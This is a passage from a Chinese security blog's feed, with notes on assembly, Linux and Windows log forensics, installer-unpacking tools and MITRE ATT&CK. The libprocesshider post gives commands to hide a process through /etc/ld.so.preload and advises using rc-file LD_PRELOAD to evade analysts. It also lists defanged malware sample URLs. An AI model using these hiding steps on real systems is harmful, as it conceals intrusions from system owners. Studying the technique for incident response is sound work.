包含了独立的二进制位，主要用于反映处理器的状态和ALU运算结果的某些特征及控制指令的执行。</p><table><thead><tr><th>标志位（外语缩写）</th><th>标志位名称</th><th>1</th><th>0</th></tr></thead><tbody><tr><td>CF</td><td>进位标志</td><td>进位</td><td>无进位</td></tr><tr><td>PF</td><td>奇偶标志</td><td>偶</td><td>奇</td></tr><tr><td>AF</td><td>辅助进位标志</td><td>进位</td><td>无进位</td></tr><tr><td>ZF</td><td>零标志</td><td>等于零</td><td>不等于零</td></tr><tr><td>SF</td><td>符号标志</td><td>负</td><td>非负</td></tr><tr><td>TF</td><td>跟踪标志</td><td>单步工作方式</td><td>连续工作方式</td></tr><tr><td>IF</td><td>中断标志</td><td>允许</td><td>禁止</td></tr><tr><td>DF</td><td>方向标志</td><td>减少</td><td>增加</td></tr><tr><td>OF</td><td>溢出标志</td><td>溢出</td><td>未溢出</td></tr></tbody></table><p><strong>指令指针寄存器</strong> EIP（Instruction Pointer），用于指向下一条要执行的指令。</p><h3 id="64位x86-64处理器"><a href="#64位x86-64处理器" class="headerlink" title="64位x86-64处理器"></a>64位x86-64处理器</h3><p>x86-64处理器向下兼容x86指令集，且比x86处理器多了8个通用寄存器（R8到R15）。</p><p>x86-64通用寄存器RAX、RBX、RCX、RDX、RDI、RSI、RBP、RSP、R8、R9、R10、R11、R12、R13、R14、R15。</p><h3 id="处理器架构"><a href="#处理器架构" class="headerlink" title="处理器架构"></a>处理器架构</h3><p><strong>IA32和x86</strong></p><p>IA-32为Intel Architecture 32bit简称，即英特尔32位体系架构，在英特尔公司1985年推出的80386微处理器中首先采用。通常也被称为i386、x86-32、x86等。</p><p><strong>x86-64、x64、AMD64、Intel64</strong></p><p>后来AMD推出了兼容32位的64位集关于IA-32的扩展，之后改名为AMD64，Intel后来也采用该架构，在其文档中称为Intel64。同时，该架构又被称为x86-64或者x64。</p><p>以上都属于x86架构，使用CISC（Complex Instruction Set Computer，复杂指令集计算机）。</p><p>其他主流cpu架构还包括<strong>ARM</strong>、<strong>RISC-V</strong>、<strong>MIPS</strong>。</p><p><strong>IA64</strong>是后来intel和惠普联合推出的64位体系架构，但是不兼容原有的32位体系结构的应用程序，导致市场惨淡。不属于x86架构。</p><h2 id="汇编语言基础"><a href="#汇编语言基础" class="headerlink" title="汇编语言基础"></a>汇编语言基础</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;32位程序模板(Template.asm)<br>.386<br>.model flat, stdcall<br>.stack 4096<br>ExitProcess PROTO, dwExitCode:DWORD<br><br>.data<br>;在这里声明变量<br>.code<br>main PROC<br>;在这里编写自己的代码<br>INVOKE ExitProcess,0<br>main ENDP<br>END main<br></code></pre></td></tr></table></figure><p>用汇编语言编写的源程序不能直接在其目标计算机上执行，必须通过汇编将其转换为可执行代码。汇编器生成包含机器语言的文件，称为目标文件（object file）。这个文件还没有准备好执行，它还需传递给一个被称为链接器（linker）的程序，从而生成可执行文件（executable file）。编辑、汇编、链接和执行汇编语言程序的过程，如下：、</p><ul><li>步骤1：编程者用编辑器创建一个ASCIl文本文件，称之为源文件。</li><li>步骤2：汇编器读取源文件，并生成目标文件，即对程序的机器语言翻译。或者，它也会生成列表文件。只要出现任何错误，编程者就必须返回步骤1，修改程序。</li><li>步骤3：链接器读取并检查目标文件，以便发现该程序是否包含了任何对链接库中过程的调用。链接器从链接库中复制任何被请求的过程，将它们与目标文件组合，以生成可执行文件。</li><li>步骤4：操作系统加载程序将可执行文件读入内存，并使CPU分支到该程序起始地址，然后程序开始执行。</li></ul><p><img src="/2023/02/13/%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96-%E9%93%BE%E6%8E%A5-%E6%89%A7%E8%A1%8C%E5%91%A8%E6%9C%9F.png" alt="image-20230207160612066"></p><p><strong>列表文件</strong>（listingfile）包括了程序源文件的副本，再加上行号、每条指令的数字地址、每条指令的机器代码字节（十六进制）以及符号表。符号表中包含了程序中所有标识符的名称、段和相关信息。</p><h3 id="传递参数"><a href="#传递参数" class="headerlink" title="传递参数"></a>传递参数</h3><p>x86-32时，使用栈传递参数。程序中的参数会以从右往左的方向依次压入栈中。这也是方便出栈时，左边第一个参数最先出来。</p><p>x86-64时，前6个基础类型参数通过寄存器传递，第7个参数开始用栈传递。通过寄存器传递可减少压栈和弹栈开销，提升性能。具体来说，<strong>前6个参数分别通过寄存器rdi，rsi，rdx，rcx，r8和r9寄存器传递</strong>，剩下的参数，依次通过调用者的rsp+0，rsp+8，rsp+16，……，rsp+8^N 这些地址空间传递。</p><table><thead><tr><th>rdi</th><th>rsi</th><th>rdx</th><th>rcx</th><th>r8</th><th>r9</th><th>栈传递</th></tr></thead></table><p>在Windows 64位系统中，函数参数传递的顺序通常是按照以下规则：</p><ol><li><strong>整数和指针参数：</strong> 从左到右依次压入64位寄存器 <code>RCX</code>, <code>RDX</code>, <code>R8</code>, <code>R9</code>。如果参数超过4个或者是浮点数，则额外的参数通过栈传递。</li><li><strong>浮点数参数：</strong> 浮点数参数通过 <code>XMM0</code>, <code>XMM1</code>, <code>XMM2</code>, <code>XMM3</code> 寄存器传递，超过4个或者是整数参数则通过栈传递。</li></ol><p>这种参数传递顺序适用于大多数的函数调用约定（calling convention）在Windows x64系统上。</p><p><a href="https://learn.microsoft.com/zh-cn/cpp/build/x64-calling-convention?view=msvc-170#parameter-passing">https://learn.microsoft.com/zh-cn/cpp/build/x64-calling-convention?view=msvc-170#parameter-passing</a></p><h3 id="栈和栈桢"><a href="#栈和栈桢" class="headerlink" title="栈和栈桢"></a>栈和栈桢</h3><p>汇编中一般堆栈（stack）指的就是栈（stack），**区分堆(heap)、栈(stack)、堆栈(stack)**。</p><p>堆栈帧（stack frame）（或活动记录（activation record））是一块堆栈保留区域，用于保存被传递的实际参数、子程序的返回值、局部变量以及被保存的寄存器。</p><p>寄存器EBP指向当前的栈帧的底部，寄存器ESP指向当前的栈帧的顶部。  </p><p>注意：EBP指向当前位于系统栈最上边一个栈帧的底部，而不是系统栈的底部。严格说来，“栈帧底部”和“栈底”是不同的概念；ESP所指的栈帧顶部和系统栈的顶部是同一个位置。</p><p><a href="https://blog.csdn.net/melonyzzZ/article/details/127754271">https://blog.csdn.net/melonyzzZ/article/details/127754271</a></p>]]></content>
    
    
    <categories>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>libprocesshider隐藏指定进程</title>
    <link href="/2023/02/10/libprocesshider%E9%9A%90%E8%97%8F%E6%8C%87%E5%AE%9A%E8%BF%9B%E7%A8%8B/"/>
    <url>/2023/02/10/libprocesshider%E9%9A%90%E8%97%8F%E6%8C%87%E5%AE%9A%E8%BF%9B%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<p>项目地址：<a href="https://github.com/gianlucaborello/libprocesshider">https://github.com/gianlucaborello/libprocesshider</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/gianlucaborello/libprocesshider.git<br></code></pre></td></tr></table></figure><p>修改 processhider.c，设置process_to_filter 值为自己想要隐藏的进程名。 </p><img src="image-20230210145455674.png" alt="image-20230210145455674" style="zoom:50%;" /><p>然后依次执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd libprocesshider/ &amp;&amp; make<br>cp libprocesshider.so /usr/local/lib/        <br>echo /usr/local/lib/libprocesshider.so &gt;&gt; /etc/ld.so.preload<br></code></pre></td></tr></table></figure><p>此时再运行top或者ps相应进程就不可见了</p><p><strong>原理</strong></p><p>查看processhider.c源码可以发现，原理上就是重写了readdir的系统调用，因为无论ps,top,ls都会调用readdir，process_to_filter定义了你要过滤进程的名字，这样就达到了过滤隐藏目的。</p><p>利用 LD_PRELOAD 来实现系统函数的劫持，<strong>程序在执行外部库函数调用的时候，会根据动态库的优先级来加载库函数，linux下库的加载顺序为&#x2F;etc&#x2F;ld.so.preload（ LD_PRELOAD）&gt;&#x2F;etc&#x2F;ld.so.cache&gt;&#x2F;etc&#x2F;ld.so.conf</strong>，当程序调用外部库的函数，如果LD_PRELOAD里面有自定义和其他系统库相同的库函数，则优先加载我们自定义的函数，这样就达到了劫持系统函数的目的。</p><p>由于ps,top,ls等几乎所有的查看命令都基于readdir系统调用，所以能够完美的隐藏掉进程，对付一般的小白是完全够用了。如果为了避免分析人员查找&#x2F;etc&#x2F;ld.so.preload而定位到进程，我们可以不创建ld.so.preload文件，而使用LD_PRELOAD宏来定义库的路径。例如将export LD_PRELOAD&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;libprocesshider.so放到linux系统启动过程中rc文件去加载，加大定位的难度。</p><p><strong>关联样本</strong></p><p>htt^p:&#x2F;&#x2F;5.133.65.53&#x2F;soft&#x2F;linux&#x2F;sshpkit.so</p><p>htt^p:&#x2F;&#x2F;5.133.65.53&#x2F;soft&#x2F;linux&#x2F;sshkit.so</p><p><img src="/2023/02/10/libprocesshider%E9%9A%90%E8%97%8F%E6%8C%87%E5%AE%9A%E8%BF%9B%E7%A8%8B/image-20230210151713746.png" alt="image-20230210151713746"></p>]]></content>
    
    
    <categories>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux HOOK</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux日志笔记</title>
    <link href="/2023/02/01/Linux%E6%97%A5%E5%BF%97%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/02/01/Linux%E6%97%A5%E5%BF%97%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>Linux系统日志一般存放在 <strong>&#x2F;var&#x2F;log&#x2F;</strong> 目录下</p><p>比较重要的日志如下</p><table><thead><tr><th>日志文件</th><th align="left">说明</th></tr></thead><tbody><tr><td>&#x2F;var&#x2F;log&#x2F;<strong>boot.log</strong></td><td align="left">用于记录系统启动信息的日志，一般用于查看在系统启动时所有相关信息</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;<strong>cron</strong></td><td align="left">Linux的计划任务相关信息的日志，用来找寻攻击者可能写入的恶意计划任务</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;<strong>maillog</strong></td><td align="left">记录邮件信息</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;<strong>messages</strong></td><td align="left">记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如执行程序、系统错误、启动信息等</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;<strong>secure</strong></td><td align="left">记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，以及添加用户和修改用户密码等操作</td></tr></tbody></table><p>以及</p><table><thead><tr><th>日志文件</th><th align="left">说明</th></tr></thead><tbody><tr><td>&#x2F;var&#x2F;log&#x2F;<strong>btmp</strong></td><td align="left">用于记录错误登录的日志，这个文件是二进制文件，要使用<strong>lastb</strong>命令查看</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;<strong>lastlog</strong></td><td align="left">记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，要使用<strong>lastlog</strong>命令查看</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;<strong>wtmp</strong></td><td align="left">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，要使用<strong>last</strong>命令来查看</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;<strong>utmp</strong></td><td align="left">记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件需要使用<strong>w,who,users</strong>等命令来查询</td></tr></tbody></table><p><strong>其中，secure日志尤为重要</strong></p><p>统计爆破ip</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">grep -i Failed /var/log/secure | awk &#x27;&#123;print $(NF-3)&#125;&#x27; | sort | uniq -c | sort -rn <br></code></pre></td></tr></table></figure><p>查看登陆成功情况</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27; <br></code></pre></td></tr></table></figure><p><strong>常用命令</strong></p><p>lscup   查看cup信息</p><p>uname -a或cat &#x2F;proc&#x2F;version   操作系统信息</p><p>cat &#x2F;etc&#x2F;passwd  系统所有账户</p><p>awk -F: ‘{if($3&#x3D;&#x3D;0)print $1}’ &#x2F;etc&#x2F;passwd   超级权限账户</p><p>cat &#x2F;etc&#x2F;passwd | grep ‘&#x2F;bin&#x2F;bash’     可登录账户</p><p>lastb | head -n 20   最近20条登录失败信息</p><p>lastlog    所有账号最后登录信息</p><p>last | head -n 20   最近20条登录信息</p><p>ls -lat &#x2F;etc&#x2F;init.d&#x2F;    启动项</p><p>crontab -l  查看计划任务</p><p>crontab -u root -l 查看root 用户的任务计划</p><p>netstat -antlp   网络连接</p><p>ls -lat &#x2F;proc&#x2F;****  查找对应运行程序</p><p>top &#x2F; ps aux  检查进程</p><p>chkconfig –list 查看系统中运行的服务</p><p><strong>参考</strong></p><p><a href="https://blog.csdn.net/weixin_45300266/article/details/123515941">https://blog.csdn.net/weixin_45300266/article/details/123515941</a></p>]]></content>
    
    
    <categories>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>应急溯源</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows日志学习</title>
    <link href="/2023/01/30/Windows%E6%97%A5%E5%BF%97%E5%AD%A6%E4%B9%A0/"/>
    <url>/2023/01/30/Windows%E6%97%A5%E5%BF%97%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h3 id="日志类型"><a href="#日志类型" class="headerlink" title="日志类型"></a>日志类型</h3><p><strong>Windows系统日志</strong>：记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。</p><p><strong>Linux系统日志</strong>：记录linux系统运行中发生的各种类型的消息文件，包括 linux内核消息、用户登录消息、程序运行信息等。</p><p><strong>应用日志</strong>：包括但不限于Web应用、应用程序等众多繁杂的日志。</p><h3 id="Windows系统日志"><a href="#Windows系统日志" class="headerlink" title="Windows系统日志"></a>Windows系统日志</h3><p>Windows操作系统在其运行的生命周期中会记录其大量的日志信息，这些日志信息包括：Windows事件日志（Event Log），Windows服务器系统的IIS日志，FTP日志，Exchange Server邮件服务，MS SQL  Server数据库日志等。处理应急事件时，客户提出需要为其提供溯源，这些日志信息在取证和溯源中扮演着重要的角色。</p><h4 id="开启审核策略"><a href="#开启审核策略" class="headerlink" title="开启审核策略"></a>开启审核策略</h4><p>运行 <strong>secpol.msc</strong> 可以打开本地安全策略，依次点开本地策略-审核策略。可以看到windows默认情况是没有开启审核策略的。不开启特定策略的话，Windows日志就不会记录某些事件，比如登录事件，进程创建事件等等。根据需要修改审核策略的属性，将全部审核操作选上成功和失败。</p><img src="image-20230129110644163.png" alt="image-20230129110644163" style="zoom: 67%;" /><p>使用 <strong>管理员身份运行</strong> 以下bat打开全部策略</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> [version] &gt;1.inf <br><span class="hljs-built_in">echo</span> signature=<span class="hljs-string">&quot;$CHICAGO$&quot;</span> &gt;&gt;1.inf <br><span class="hljs-built_in">echo</span> [Event Audit] &gt;&gt;1.inf <br><span class="hljs-built_in">echo</span> AuditSystemEvents=3 &gt;&gt;1.inf <br><span class="hljs-built_in">echo</span> AuditObjectAccess=3 &gt;&gt;1.inf <br><span class="hljs-built_in">echo</span> AuditPrivilegeUse=3 &gt;&gt;1.inf <br><span class="hljs-built_in">echo</span> AuditPolicyChange=3 &gt;&gt;1.inf <br><span class="hljs-built_in">echo</span> AuditAccountManage=3 &gt;&gt;1.inf <br><span class="hljs-built_in">echo</span> AuditProcessTracking=3 &gt;&gt;1.inf <br><span class="hljs-built_in">echo</span> AuditDSAccess=3 &gt;&gt;1.inf <br><span class="hljs-built_in">echo</span> AuditAccountLogon=3 &gt;&gt;1.inf <br><span class="hljs-built_in">echo</span> AuditLogonEvents=3 &gt;&gt;1.inf <br>secedit /configure /db 1.sdb /cfg 1.inf /log 1.<span class="hljs-built_in">log</span> /quiet <br>del 1.*<br>pause<br></code></pre></td></tr></table></figure><h4 id="日志分类"><a href="#日志分类" class="headerlink" title="日志分类"></a>日志分类</h4><p>Windows系统的日志文件存放在 <strong>C:&#x2F;windows&#x2F;system32&#x2F;winevt&#x2F;logs</strong> 目录下。</p><p>Windows系统中自带事件查看器工具，它可以用来查看分析所有的Windows系统日志。运行 <strong>eventvwr</strong> 可以快速打开事件查看器。使用该工具可以看到系统日志被分为了两大类：Windows日志、应用程序和服务日志。</p><img src="image-20230129134848790.png" alt="image-20230129134848790" style="zoom: 50%;" /><p>其中，Windows日志三个核心日志文件，分别是：</p><ol><li>系统日志：System.evtx    (系统组件等日志) </li><li>应用程序日志：Application.evtx (应用程序等日志)</li><li>安全日志：Security.evtx    (系统登录等日志)</li></ol><p>上述日志文件默认大小均为20480KB（20MB），记录事件数据超过20MB时，默认系统将优先覆盖过期的日志记录。</p><p>另外，应用程序和服务日志包含Windows系统中其它各类重要服务组件的事件日志。例如，<strong>Microsoft</strong>&gt;<strong>Windows</strong>&gt;<strong>TerminalServices-LocalSessionManager</strong>&gt;<strong>Operational</strong>，记录了用户远程桌面的访问日志，可以通过该日志定位远程登录的相关问题。</p><p>大部分日志默认最大为1028KB，超过最大限制也优先覆盖过期的日志记录。</p><p>可以通过日志属性修改日志保存的大小，延长日志保存时间。《网络安全法》规定网络日志留存不少于六个月。</p><img src="image-20230129134551968.png" alt="image-20230129134551968" style="zoom: 50%;" /><h4 id="日志属性"><a href="#日志属性" class="headerlink" title="日志属性"></a>日志属性</h4><p>Windows事件日志属性如下：</p><img src="image-20230129154553204.png" alt="image-20230129154553204" style="zoom: 50%;" /><table><thead><tr><th>属性名</th><th>描述</th></tr></thead><tbody><tr><td>日志名称</td><td>已记录事件的日志的名称</td></tr><tr><td>来源</td><td>记录事件的软件，可以是程序名，也可以是系统或大型程序的组件（如驱动程序名）。</td></tr><tr><td>记录时间</td><td>记录事件的日期和时间</td></tr><tr><td>事件ID</td><td>标识特定事件类型的编号。</td></tr><tr><td>任务类别</td><td>用于表示事件发行者的子组件或活动。</td></tr><tr><td>级别</td><td>事件严重性的分类，包括<strong>信息</strong>、<strong>警告</strong>、<strong>错误</strong>、<strong>审核成功</strong>、<strong>审核失败</strong>。</td></tr><tr><td>关键字</td><td>可用于筛选或搜索事件的一组类别或标记。</td></tr><tr><td>用户</td><td>事件发生所代表的用户的名称。</td></tr><tr><td>计算机</td><td>发生事件的计算机的名称。</td></tr></tbody></table><p>Windows 事件 ID详见 <a href="https://learn.microsoft.com/zh-cn/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor">https://learn.microsoft.com/zh-cn/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor</a></p><p>常见的事件ID</p><table><thead><tr><th>事件ID</th><th>说明</th></tr></thead><tbody><tr><td>1102</td><td>清理审计日志</td></tr><tr><td><strong>4624</strong></td><td><strong>账号登录成功</strong></td></tr><tr><td><strong>4625</strong></td><td><strong>账号登录失败</strong></td></tr><tr><td>4634</td><td>账号注销成功</td></tr><tr><td>4647</td><td>用户启动的注销</td></tr><tr><td><strong>4672</strong></td><td><strong>使用超级用户（如管理员）进行登录</strong></td></tr><tr><td><strong>4720</strong></td><td><strong>创建用户</strong></td></tr><tr><td><strong>4726</strong></td><td><strong>删除用户</strong></td></tr><tr><td>4732</td><td>将成员添加到启用安全的本地组中</td></tr><tr><td>4733</td><td>将成员从启用安全的本地组中移除</td></tr><tr><td><strong>4688</strong></td><td><strong>创建新进程</strong></td></tr><tr><td>4689</td><td>结束进程</td></tr><tr><td><strong>4698</strong></td><td><strong>创建计划任务</strong></td></tr><tr><td><strong>4699</strong></td><td><strong>删除计划任务</strong></td></tr></tbody></table><p>每个<strong>成功登录</strong>的事件都会标记一个登录类型，不同登录类型代表不同的方式：</p><table><thead><tr><th>登录类型</th><th>描述</th><th>说明</th></tr></thead><tbody><tr><td>2</td><td>交互式登录（Interactive）</td><td>用户在本地进行登录。</td></tr><tr><td>3</td><td>网络（Network）</td><td>最常见的情况就是连接到共享文件夹或共享打印机时。</td></tr><tr><td>4</td><td>批处理（Batch）</td><td>通常表明某计划任务启动。</td></tr><tr><td>5</td><td>服务（Service）</td><td>每种服务都被配置在某个特定的用户账号下运行。</td></tr><tr><td>7</td><td>解锁（Unlock）</td><td>屏保解锁。</td></tr><tr><td>8</td><td>网络明文（NetworkCleartext）</td><td>登录的密码在网络上是通过明文传输的，如FTP。</td></tr><tr><td>9</td><td>新凭证（NewCredentials）</td><td>使用带&#x2F;Netonly参数的RUNAS命令运行一个程序。</td></tr><tr><td>10</td><td>远程交互（RemoteInteractive）</td><td>通过终端服务、远程桌面或远程协助访问计算机。</td></tr><tr><td>11</td><td>缓存交互（CachedInteractive）</td><td>以一个域用户登录而又没有域控制器可用</td></tr></tbody></table><img src="image-20230129160202628.png" alt="image-20230129160202628" style="zoom:50%;" /><h4 id="日志分析工具"><a href="#日志分析工具" class="headerlink" title="日志分析工具"></a>日志分析工具</h4><p><strong>Event Log Explorer</strong><br>下载地址：<a href="https://event-log-explorer.en.softonic.com/">https://event-log-explorer.en.softonic.com/</a><br>Event Log Explorer是一款非常好用的Windows日志分析工具。可用于查看，监视和分析跟事件记录，包括安全，系统，应用程序和其他微软Windows 的记录被记载的事件，其强大的过滤功能可以快速的过滤出有价值的信息。</p><img src="image-20230130101428862.png" alt="image-20230130101428862" style="zoom:50%;" /><p><strong>Log Parser</strong> <a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">https://www.microsoft.com/en-us/download/details.aspx?id=24659</a></p><p>Windows日志分析的工具很多，个人感觉并没有什么区别，只是辅助分析的作用。事件查看器有时候就足够了。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://forum.butian.net/share/355">https://forum.butian.net/share/355</a></p>]]></content>
    
    
    <categories>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>应急溯源</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MSI、NSIS、AutoIt以及CHM分析工具</title>
    <link href="/2023/01/11/MSI%E3%80%81NSIS%E3%80%81AutoIt%E4%BB%A5%E5%8F%8ACHM%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/"/>
    <url>/2023/01/11/MSI%E3%80%81NSIS%E3%80%81AutoIt%E4%BB%A5%E5%8F%8ACHM%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<h3 id="MSI"><a href="#MSI" class="headerlink" title="MSI"></a>MSI</h3><ol><li><p>lessmsi工具</p></li><li><p>msiexec命令</p></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">msiexec /a test.msi /qb TARGETDIR=D:\test<br></code></pre></td></tr></table></figure><h3 id="NSIS"><a href="#NSIS" class="headerlink" title="NSIS"></a>NSIS</h3><p>官网对反编译的解释 <a href="https://nsis.sourceforge.io/Can_I_decompile_an_existing_installer#Extraction_Tools">https://nsis.sourceforge.io/Can_I_decompile_an_existing_installer#Extraction_Tools</a></p><p>可以使用<strong>7zip</strong>工具  <a href="https://7-zip.org/">https://7-zip.org/</a></p><p>另：分析可参考，NSIS用户手册中文版 <a href="https://www.wenjiangs.com/doc/5d4zeojt">https://www.wenjiangs.com/doc/5d4zeojt</a></p><h3 id="AutoIt"><a href="#AutoIt" class="headerlink" title="AutoIt"></a>AutoIt</h3><p>AutoIt3 Decompiler</p><p>升级版 <a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1774093">https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1774093</a></p><h3 id="CHM"><a href="#CHM" class="headerlink" title="CHM"></a>CHM</h3><ol><li><p>ChmDecompiler工具</p></li><li><p>hh命令</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hh -decompile  &lt;输出路径&gt;  &lt;目标chm文件&gt;<br></code></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/weixin_42591908/article/details/112089065">https://blog.csdn.net/weixin_42591908/article/details/112089065</a></p>]]></content>
    
    
    <categories>
      
      <category>基础知识</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于ATT&amp;CK</title>
    <link href="/2022/12/12/%E5%85%B3%E4%BA%8EATT-CK/"/>
    <url>/2022/12/12/%E5%85%B3%E4%BA%8EATT-CK/</url>
    
    <content type="html"><![CDATA[<h2 id="ATT-amp-CK简介"><a href="#ATT-amp-CK简介" class="headerlink" title="ATT&amp;CK简介"></a>ATT&amp;CK简介</h2><p>ATT&amp;CK的全称是 <strong>Adversarial Tactics, Techniques, and Common Knowledge</strong>(对抗战术、技术和常识)。由<strong>MITRE</strong>公司于2013年首次提出，该公司一直以来都在为美国政府及军方服务，其中包括**CVE(Common Vulnerabilities &amp; Exposures)**。</p><blockquote><p><em>MITRE ATT&amp;CK® is a globally-accessible knowledge base of adversary tactics and techniques based on real-world observations.</em> </p><p>The ATT&amp;CK knowledge base is used as a foundation for the  development of specific threat models and methodologies in the private  sector, in government, and in the cybersecurity product and service  community.</p><p><a href="https://attack.mitre.org/">https://attack.mitre.org/</a></p></blockquote><p>从官方的描述可以看出，ATT&amp;CK定位是一个关于对抗战术和技术的知识库，是开发特定威胁模型和方法论的基础。</p><p>ATT&amp;CK分为三个技术域，即 Enterprise(用于传统企业网络和云技术)、Mobile(用于移动通信设备)、ICS(用于工业控制系统)。</p><p><img src="/2022/12/12/%E5%85%B3%E4%BA%8EATT-CK/image-20221206101634615.png" alt="image-20221206101634615"></p><p>其中Enterprise应用最为广泛，也是研究人员的重点研究方向，本次也是主要就ATT&amp;CK for Enterprise进行学习。</p><h2 id="TTPs"><a href="#TTPs" class="headerlink" title="TTPs"></a>TTPs</h2><p>ATT&amp;CK是一个<strong>基于黑客攻击实战结果</strong>建立的网络攻击战术和技术的知识体系，它描述了网络攻击的行为模型，反映出整个攻击周期的各个阶段。它包含三个基础元素，战术、技术和过程，即Tactics, Techniques and Procedures(TTPs)。</p><p><em>有的地方认为Procedures可以翻译为程序，但是根据痛苦金字塔(The Pyramid of Pain)模型，在模型第二层就已经出现了Tools。</em><a href="https://attack.mitre.org/resources/faq/">https://attack.mitre.org/resources/faq/</a> 也很清楚的解释了什么是Procedures*</p><p><img src="/2022/12/12/%E5%85%B3%E4%BA%8EATT-CK/image-20221205135702941.png" alt="image-20221205135702941"></p><p>可以说，TTPs 就是指攻击者从踩点到数据泄漏以及两者间的每一步是“如何”完成任务的。</p><p>ATT&amp;CK就是有效分析攻击者行为（也即TTPs）的威胁分析技术。<strong>ATT&amp;CK框架核心就是以矩阵形式展现的TTPs</strong>。</p><h2 id="ATT-amp-CK-Matrix-for-Enterprise"><a href="#ATT-amp-CK-Matrix-for-Enterprise" class="headerlink" title="ATT&amp;CK Matrix for Enterprise"></a>ATT&amp;CK Matrix for Enterprise</h2><p><img src="/2022/12/12/%E5%85%B3%E4%BA%8EATT-CK/image-20221205161943701.png" alt="image-20221205161943701"></p><p>横轴代表的是战术（Tactics），包括战术14个，即侦察、资源开发、初始访问、执行、持久化、权限提升、防御绕过、凭证获取、发现、横向移动、搜集、命令控制、数据窃取、危害。ID以TA开头，形式为TA****。<a href="https://attack.mitre.org/tactics/enterprise/">https://attack.mitre.org/tactics/enterprise/</a></p><p>纵轴代表的是技术（Techniques），包括技术193个，ID以T开头，形式为T<strong><strong>；子技术401个，ID以T开头，形式为T</strong></strong>.0**。</p><p><a href="https://attack.mitre.org/techniques/enterprise/">https://attack.mitre.org/techniques/enterprise/</a></p><p>在每个Techniques页面都会有相应的解释，以及Procedure Examples、Mitigations、Mitigations等。</p><p><em>(基于ATT&amp;CK v12)</em></p><h2 id="其他ATT-amp-CK关键对象"><a href="#其他ATT-amp-CK关键对象" class="headerlink" title="其他ATT&amp;CK关键对象"></a>其他ATT&amp;CK关键对象</h2><p>ATT&amp;CK除了战术（Tactics）和技术（Techniques）两个对象外，还提出了数据源（Data Sources）、缓解措施（Mitigations ）、组织（Groups）、软件（Software）、活动（Campaigns）五个方面。</p><p><strong>Data 